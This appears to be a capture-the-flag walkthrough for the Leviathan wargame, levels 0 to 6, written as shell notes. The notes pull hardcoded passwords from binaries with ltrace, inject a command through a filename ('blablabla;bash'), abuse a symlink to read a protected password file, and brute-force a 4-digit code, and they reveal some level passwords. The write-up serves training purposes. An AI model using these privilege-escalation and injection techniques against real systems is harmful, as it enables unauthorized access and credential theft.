0.	> ls -al
	found a hidden dir .backup with a file bookmarks.html in it
	> cat bookmarks.html | grep password
	and we found a suspicious password be found
1.	> strings check
	> ltrace ./check
	password for check is "sex"
	> ./check
	> sex
	got the shell
	> cat /etc/leviathan_pass/leviathan2
2. 	> ./printfile /etc/passwd
	> ./printfile /etc/leviathan_pass/leviathan3
	but our bash is leviathan2, so the above command was denied
	in ltrace ./printfile /etc/passwd
	we found that it is concatenating our input filename with the command, so let's use command injection, 
	in /temp create a file 'blablabla;bash'
	> ~/printfile blablabla;bash
	and we can get the userid leviathan3
	> cat /etc/leviathan_pass/leviathan3
3. 	There's a elf file named level3
	> ltrace ./level3
	we found a strcmp(<input>, "snlprintf\n")
	> ./level3
	> snlprintf
	we got the shell	> cat /etc/leviathan_pass/leviathan4
4.	In a hidden dir .trash there's an elf file
	> ./bin
	output is a sereies of binary bytes
	do some command line konfu and transform it into Ascii
	> ./bin | tr ' ' '\n' | while read line; do echo "obase=16;ibase=2;$line" | bc ; done | tr -d '\n' | xxd -r -p
	then we got the password
5. 	While running leviathan5, it requires a file /tmp/file.log
	so we create one and run it, the program seems to print what's in the file and then deletes the file
	so we use the following command to symbolicly link the wanted file with it
	> ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
	> ./leviathan5
6.	There's a file leviathan6
	usage: ./leviathan6 <4 digit code>
	> for i in {0000..9999}; do echo $i; ./leviathan6 $i; done
	and we found that we get into the shell with code 7123
	> cat /etc/leviathan_pass/leviathan7
